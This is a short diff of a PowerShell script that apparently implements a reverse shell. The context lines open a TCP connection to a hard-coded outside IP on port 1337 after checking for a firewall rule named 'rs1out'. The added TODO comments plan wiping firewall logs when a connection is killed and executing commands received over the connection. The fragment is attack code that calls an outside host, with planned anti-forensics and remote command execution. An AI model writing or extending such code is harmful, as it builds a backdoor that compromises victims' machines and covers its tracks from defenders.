@@ -11,6 +11,10 @@ if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 }
 
 
+
+#TODO: Add firewall log wipes during killed connection.
+#TODO: Add rpc reciever to execute received commands.
+
 try {
 	$client = New-Object System.Net.Sockets.TCPClient("73.113.78.58", 1337);
 	$stream = $client.GetStream();
